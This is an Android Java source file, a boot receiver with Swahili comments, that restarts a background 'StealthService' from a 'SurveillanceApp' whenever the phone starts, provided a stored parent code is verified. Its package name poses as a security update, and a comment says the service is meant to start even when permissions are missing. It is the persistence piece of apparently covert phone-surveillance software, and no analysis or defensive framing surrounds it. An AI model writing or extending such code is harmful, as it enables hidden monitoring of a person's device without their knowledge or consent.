package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "📱 Simu imewashwa - Inaanzisha app tena automatikali...");
            
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            boolean verified = prefs.getBoolean("verified", false);
            
            if (verified && !parentCode.isEmpty()) {
                // Anza service tena automatikali
                Intent serviceIntent = new Intent(context, StealthService.class);
                serviceIntent.putExtra("PARENT_CODE", parentCode);
                
                // Hakikisha service inaenda kuanza hata permissions zikikosa
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
                
                Log.d(TAG, "✅ StealthService imeanzishwa tena baada ya boot");
            } else {
                Log.d(TAG, "ℹ️ App haija verify bado au hakuna parent code");
            }
        }
    }
}
